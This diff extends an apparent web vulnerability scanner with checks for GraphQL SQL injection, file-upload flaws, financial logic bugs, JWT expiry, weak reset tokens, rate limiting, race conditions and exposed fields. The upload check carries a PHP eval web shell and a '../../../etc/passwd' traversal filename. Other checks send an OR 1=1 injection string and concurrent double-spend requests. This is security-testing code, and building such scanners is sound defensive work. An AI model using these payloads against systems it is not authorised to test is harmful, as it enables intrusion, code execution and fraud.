@@ -310,6 +310,15 @@ class WebScanner:
             self.check_lfi,
             self.check_xxe,
             self.check_graphql_introspection,
+            self.check_financial_logic,
+            self.check_file_upload,
+            self.check_token_storage,
+            self.check_session_expiration,
+            self.check_password_reset_strength,
+            self.check_rate_limiting,
+            self.check_race_conditions,
+            self.check_bopla,
+            self.check_predictable_identifiers,
             self.check_jwt_algorithm_confusion,
             self.check_prototype_pollution,
             self.check_cache_poisoning,
@@ -1394,6 +1403,465 @@ class WebScanner:
                         break
                 except json.JSONDecodeError:
                     pass
+
+        # GraphQL depth/complexity check — detect excessive schema exposure
+        for path in self.GRAPHQL_ENDPOINTS:
+            url = urljoin(self.target_url, path.lstrip("/"))
+            depth_query = {
+                "query": "{__schema{types{name,fields{name,type{name,fields{name}}}}}}"
+            }
+            resp = self._safe_request(
+                "POST", url,
+                json=depth_query,
+                headers={"Content-Type": "application/json"}
+            )
+            if resp and resp.status_code == 200 and len(resp.text) > 5000:
+                self._add_finding(
+                    finding_type="GRAPHQL_DEEP_INTROSPECTION",
+                    severity="MEDIUM",
+                    endpoint=url,
+                    evidence={
+                        "response_size": len(resp.text),
+                        "message": "GraphQL schema exposes deeply nested type details",
+                    },
+                    confidence=0.7,
+                )
+            break  # Only test first available endpoint
+
+        # GraphQL SQLi-in-resolver test
+        for path in self.GRAPHQL_ENDPOINTS[:1]:
+            url = urljoin(self.target_url, path.lstrip("/"))
+            sqli_query = {"query": '{users(search:"\\' OR 1=1--"){id,name}}'}
+            resp = self._safe_request(
+                "POST", url,
+                json=sqli_query,
+                headers={"Content-Type": "application/json"}
+            )
+            if resp and resp.status_code == 200 and resp.text and len(resp.text.strip("{} \t\n\r\x00")) > 5:
+                try:
+                    data = resp.json()
+                    if isinstance(data.get("data"), dict) and len(data.get("data", {})) > 0:
+                        self._add_finding(
+                            finding_type="GRAPHQL_SQLI_RESOLVER",
+                            severity="CRITICAL",
+                            endpoint=url,
+                            evidence={
+                                "payload": sqli_query["query"],
+                                "response_preview": json.dumps(data)[:200],
+                                "message": "Possible SQL injection in GraphQL resolver — query returned data",
+                            },
+                            confidence=0.6,
+                        )
+                except json.JSONDecodeError:
+                    pass
+
+    def check_financial_logic(self):
+        """Test financial API endpoints for business logic flaws."""
+        for path in self.TRANSFER_PATHS:
+            url = urljoin(self.target_url, path)
+            base_payload = {"from": "test_source", "to": "test_dest"}
+
+            # Test 1: Negative amount
+            neg_resp = self._safe_request("POST", url,
+                json={**base_payload, "amount": -100},
+                session=self.session)
+            if neg_resp and neg_resp.status_code in (200, 201):
+                self._add_finding(
+                    finding_type="NEGATIVE_AMOUNT_ACCEPTED",
+                    severity="HIGH",
+                    endpoint=url,
+                    evidence={"amount": -100, "status": neg_resp.status_code,
+                              "message": "API accepted a negative transaction amount"},
+                    confidence=0.85,
+                )
+
+            # Test 2: Zero amount
+            zero_resp = self._safe_request("POST", url,
+                json={**base_payload, "amount": 0},
+                session=self.session)
+            if zero_resp and zero_resp.status_code in (200, 201):
+                self._add_finding(
+                    finding_type="ZERO_AMOUNT_ACCEPTED",
+                    severity="MEDIUM",
+                    endpoint=url,
+                    evidence={"amount": 0, "status": zero_resp.status_code,
+                              "message": "API accepted a zero-value transaction"},
+                    confidence=0.75,
+                )
+
+            # Test 3: Extremely large amount
+            large_resp = self._safe_request("POST", url,
+                json={**base_payload, "amount": 99999999999},
+                session=self.session)
+            if large_resp and large_resp.status_code in (200, 201):
+                self._add_finding(
+                    finding_type="NO_TRANSACTION_LIMIT",
+                    severity="HIGH",
+                    endpoint=url,
+                    evidence={"amount": 99999999999, "status": large_resp.status_code,
+                              "message": "API accepted an extremely large amount with no limit"},
+                    confidence=0.8,
+                )
+
+            # Test 4: Idempotency / replay check
+            replay_responses = []
+            replay_payload = {**base_payload, "amount": 1}
+            for _ in range(3):
+                r = self._safe_request("POST", url, json=replay_payload, session=self.session)
+                if r:
+                    replay_responses.append(r.status_code)
+            if replay_responses.count(200) >= 2:
+                self._add_finding(
+                    finding_type="REPLAY_VULNERABLE",
+                    severity="MEDIUM",
+                    endpoint=url,
+                    evidence={"success_count": replay_responses.count(200),
+                              "total_requests": 3,
+                              "message": "API accepted repeated identical requests — no idempotency key"},
+                    confidence=0.7,
+                )
+            break  # Only test first available endpoint
+
+    def check_file_upload(self):
+        """Test file upload endpoints for security controls."""
+        # Small PHP webshell payload
+        php_payload = b"<?php @eval($_POST['cmd']); ?>"
+        malicious_payloads = [
+            ("shell.php", php_payload, "application/x-php"),
+            ("test.php.jpg", b"<?php phpinfo(); ?>", "image/jpeg"),
+            ("../../../etc/passwd", b"content", "text/plain"),
+            ("test.phtml", php_payload, "application/x-httpd-php"),
+            ("test.phar", php_payload, "application/octet-stream"),
+        ]
+
+        for path in self.UPLOAD_PATHS:
+            url = urljoin(self.target_url, path)
+            for filename, content, mime in malicious_payloads:
+                resp = self._safe_request("POST", url,
+                    files={"file": (filename, content, mime)},
+                    session=self.session)
+                if resp and resp.status_code in (200, 201):
+                    if filename.endswith(".php") or filename.endswith(".phtml") or filename.endswith(".phar"):
+                        self._add_finding(
+                            finding_type="UNRESTRICTED_FILE_UPLOAD",
+                            severity="CRITICAL",
+                            endpoint=url,
+                            evidence={"filename": filename, "mime": mime,
+                                      "status": resp.status_code,
+                                      "message": f"Executable file '{filename}' accepted by server"},
+                            confidence=0.9,
+                        )
+                    if ".." in filename:
+                        self._add_finding(
+                            finding_type="PATH_TRAVERSAL_IN_FILENAME",
+                            severity="HIGH",
+                            endpoint=url,
+                            evidence={"filename": filename, "status": resp.status_code,
+                                      "message": "Path traversal characters accepted in filename"},
+                            confidence=0.85,
+                        )
+                    if "." in filename and filename.split(".")[-1] != filename.rsplit(".", 1)[-1]:
+                        continue  # Already reported above
+                    if "." in filename.rsplit(".", 1)[0] and filename != "test.php.jpg":
+                        continue
+            break  # Only test first available endpoint
+
+    def check_token_storage(self):
+        """Check if JWT/session tokens are stored in localStorage."""
+        resp = self._safe_request("GET", self.target_url)
+        if not resp:
+            return
+
+        # Look for localStorage.setItem with token keywords in page JS
+        token_storage_patterns = [
+            r'localStorage\.setItem\s*\(\s*["\'].*(?:token|jwt|auth|session|access)',
+            r'localStorage\[["\'].*(?:token|jwt|auth)\s*["\']\s*\]\s*=',
+        ]
+        for pattern in token_storage_patterns:
+            match = re.search(pattern, resp.text, re.I)
+            if match:
+                context_start = max(0, match.start() - 30)
+                context_end = min(len(resp.text), match.end() + 50)
+                self._add_finding(
+                    finding_type="TOKEN_IN_LOCALSTORAGE",
+                    severity="MEDIUM",
+                    endpoint=self.target_url,
+                    evidence={
+                        "snippet": resp.text[context_start:context_end],
+                        "pattern": pattern,
+                        "message": "JWT or session token stored in localStorage — vulnerable to XSS extraction",
+                    },
+                    confidence=0.8,
+                )
+                break
+
+    def check_session_expiration(self):
+        """Check whether login tokens have expiry claims (JWT exp field)."""
+        # Try to extract JWTs from responses — look in common auth response patterns
+        auth_paths = ["/api/auth/login", "/api/login", "/auth/login"]
+        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
+
+        for path in auth_paths:
+            url = urljoin(self.target_url, path.lstrip("/"))
+            resp = self._safe_request("POST", url,
+                json={"username": "test", "password": "test"},
+                headers={"Content-Type": "application/json"})
+            if not resp:
+                continue
+
+            # Look for JWT in response body
+            tokens = re.findall(jwt_pattern, resp.text)
+            if not tokens:
+                # Check response headers too
+                auth_header = resp.headers.get("Authorization") or resp.headers.get("Set-Cookie", "")
+                tokens = re.findall(jwt_pattern, auth_header)
+
+            for raw_token in tokens[:2]:
+                try:
+                    # Decode JWT without signature verification
+                    import base64 as _b64
+                    parts = raw_token.split(".")
+                    if len(parts) != 3:
+                        continue
+                    payload_bytes = _b64.urlsafe_b64decode(parts[1] + "==")
+                    payload = json.loads(payload_bytes)
+                    exp = payload.get("exp")
+                    now = time.time()
+
+                    if not exp:
+                        self._add_finding(
+                            finding_type="NO_TOKEN_EXPIRATION",
+                            severity="HIGH",
+                            endpoint=url,
+                            evidence={
+                                "token_preview": raw_token[:30] + "...",
+                                "jwt_payload_keys": list(payload.keys()),
+                                "message": "JWT has no 'exp' claim — token never expires",
+                            },
+                            confidence=0.9,
+                        )
+                    elif exp - now > 86400 * 30:
+                        days = int((exp - now) / 86400)
+                        self._add_finding(
+                            finding_type="EXCESSIVE_TOKEN_LIFETIME",
+                            severity="MEDIUM",
+                            endpoint=url,
+                            evidence={
+                                "expiry_days": days,
+                                "token_preview": raw_token[:30] + "...",
+                                "message": f"JWT expiry set to {days} days — exceeds 30-day maximum",
+                            },
+                            confidence=0.8,
+                        )
+                except Exception:
+                    continue
+            break
+
+    def check_password_reset_strength(self):
+        """Detect weak reset tokens — numeric-only PINs, short codes."""
+        for path in self.RESET_PATHS:
+            url = urljoin(self.target_url, path)
+            resp = self._safe_request("POST", url,
+                json={"email": "test@example.com"},
+                headers={"Content-Type": "application/json"})
+            if not resp or resp.status_code not in (200, 201):
+                # Try form-encoded as fallback
+                resp = self._safe_request("POST", url,
+                    data={"email": "test@example.com"})
+
+            if resp and resp.status_code in (200, 201):
+                try:
+                    data = resp.json()
+                except json.JSONDecodeError:
+                    data = {}
+                reset_token = str(data.get("token") or data.get("code") or data.get("pin") or "")
+                if not reset_token:
+                    # Check if token is embedded in a message
+                    token_match = re.search(r'(?:token|code|pin)[:\s]+["\']?(\w{3,32})["\']?', resp.text, re.I)
+                    if token_match:
+                        reset_token = token_match.group(1)
+
+                if reset_token:
+                    if reset_token.isdigit() and len(reset_token) <= 6:
+                        self._add_finding(
+                            finding_type="WEAK_RESET_TOKEN",
+                            severity="HIGH",
+                            endpoint=url,
+                            evidence={"token_length": len(reset_token), "type": "numeric",
+                                      "message": f"Password reset uses a {len(reset_token)}-digit numeric PIN — brute-forceable"},
+                            confidence=0.85,
+                        )
+                    elif len(reset_token) < 16:
+                        self._add_finding(
+                            finding_type="SHORT_RESET_TOKEN",
+                            severity="MEDIUM",
+                            endpoint=url,
+                            evidence={"token_length": len(reset_token),
+                                      "message": f"Reset token is only {len(reset_token)} chars — minimum recommended is 32"},
+                            confidence=0.7,
+                        )
+            break  # Only test first available endpoint
+
+    def check_rate_limiting(self):
+        """Test whether endpoints enforce rate limiting."""
+        for path in self.RATE_LIMIT_PATHS:
+            url = urljoin(self.target_url, path)
+            responses = []
+            for _ in range(20):
+                r = self._safe_request("POST", url,
+                    json={"username": "test", "password": "wrong"},
+                    headers={"Content-Type": "application/json"})
+                if r:
+                    responses.append(r.status_code)
+
+            has_rate_limit = any(code in (429, 403) for code in responses)
+            if not has_rate_limit and len(responses) >= 15:
+                self._add_finding(
+                    finding_type="NO_RATE_LIMITING",
+                    severity="HIGH",
+                    endpoint=url,
+                    evidence={
+                        "requests_sent": 20,
+                        "responses_received": len(responses),
+                        "rate_limit_response_received": False,
+                        "status_codes_seen": list(set(responses)),
+                        "message": "No 429/403 response after 20 rapid requests — no rate limiting in place",
+                    },
+                    confidence=0.85,
+                )
+            break  # Only test first available endpoint
+
+    def check_race_conditions(self):
+        """Test financial endpoints for race conditions via simultaneous requests."""
+        import concurrent.futures as _cf
+
+        for path in self.RACE_PATHS:
+            url = urljoin(self.target_url, path)
+            payload = {"amount": 1, "from": "race_source", "to": "race_dest"}
+
+            # Use a barrier to maximize simultaneity
+            barrier = threading.Barrier(5, timeout=5)
+
+            def _race_request():
+                try:
+                    barrier.wait(timeout=5)
+                except threading.BrokenBarrierError:
+                    pass
+                return self._safe_request("POST", url, json=payload, session=self.session)
+
+            with _cf.ThreadPoolExecutor(max_workers=5) as executor:
+                futures = [executor.submit(_race_request) for _ in range(5)]
+                responses = [f.result() for f in _cf.as_completed(futures)]
+
+            success_count = sum(1 for r in responses if r and r.status_code in (200, 201))
+            if success_count > 1:
+                self._add_finding(
+                    finding_type="RACE_CONDITION",
+                    severity="CRITICAL",
+                    endpoint=url,
+                    evidence={
+                        "simultaneous_requests": 5,
+                        "successful_responses": success_count,
+                        "response_codes": [r.status_code for r in responses if r],
+                        "note": "Multiple concurrent requests succeeded — possible double-spend",
+                    },
+                    confidence=0.8,
+                )
+            break  # Only test first available endpoint
+
+    def check_bopla(self):
+        """Check for sensitive fields in API responses (Broken Object Property Level Auth)."""
+        api_paths = ["/api/v1/users", "/api/users", "/api/v1/accounts", "/api/accounts",
+                     "/api/v1/me", "/api/me", "/api/profile"]
+
+        for path in api_paths:
+            url = urljoin(self.target_url, path.lstrip("/"))
+            resp = self._safe_request("GET", url, session=self.session,
+                headers={"Content-Type": "application/json"})
+            if not resp or resp.status_code != 200:
+                continue
+
+            try:
+                data = resp.json()
+            except json.JSONDecodeError:
+                continue
+
+            # Search response for sensitive field names
+            data_str = json.dumps(data).lower()
+            exposed_fields = []
+            for field in self.SENSITIVE_RESPONSE_FIELDS:
+                pattern = f'"{field}"'
+                if pattern in data_str:
+                    exposed_fields.append(field)
+
+            if exposed_fields:
+                self._add_finding(
+                    finding_type="SENSITIVE_FIELD_EXPOSURE",
+                    severity="HIGH",
+                    endpoint=url,
+                    evidence={
+                        "exposed_fields": exposed_fields,
+                        "response_keys": list(data.keys()) if isinstance(data, dict) else "array",
+                        "message": f"API response includes {len(exposed_fields)} sensitive fields that should be filtered",
+                    },
+                    confidence=0.85,
+                )
+
+    def check_predictable_identifiers(self):
+        """Detect predictable object IDs via entropy analysis of sequential requests."""
+        from collections import Counter as _Counter
+        import math as _math
+
+        # Find URLs with numeric ID patterns
+        resp = self._safe_request("GET", self.target_url)
+        if not resp:
+            return
+
+        id_pattern = r'(?:/(\d{3,})(?:\?|/|$))'
+        candidate_ids = re.findall(id_pattern, resp.text)
+        if not candidate_ids:
+            return
+
+        # Make sequential requests and extract new IDs
+        all_ids = [int(x) for x in set(candidate_ids)]
+        for _ in range(4):
+            next_url = self.target_url
+            if all_ids:
+                next_url = f"{self.target_url}?id={all_ids[-1] + 1}"
+            r = self._safe_request("GET", next_url)
+            if r:
+                new_ids = [int(x) for x in re.findall(id_pattern, r.text)]
+                all_ids.extend(new_ids)
+
+        if len(all_ids) < 8:
+            return
+
+        # Shannon entropy calculation
+        counter = _Counter()
+        for i in range(len(all_ids) - 1):
+            counter[all_ids[i + 1] - all_ids[i]] += 1
+
+        total = sum(counter.values())
+        entropy = 0.0
+        for count in counter.values():
+            p = count / total
+            if p > 0:
+                entropy -= p * _math.log2(p)
+
+        # Low entropy in gaps = sequential/predictable IDs
+        if entropy < 2.0 and len(all_ids) >= 8:
+            self._add_finding(
+                finding_type="PREDICTABLE_IDENTIFIERS",
+                severity="MEDIUM",
+                endpoint=self.target_url,
+                evidence={
+                    "sample_ids": sorted(set(all_ids))[:10],
+                    "id_gaps": dict(counter.most_common(5)),
+                    "entropy": round(entropy, 2),
+                    "message": f"Object IDs have low entropy ({entropy:.1f}) — likely sequential or predictable",
+                },
+                confidence=0.7,
+            )
 
     def check_jwt_algorithm_confusion(self):
         """Check for JWT algorithm confusion vulnerabilities."""
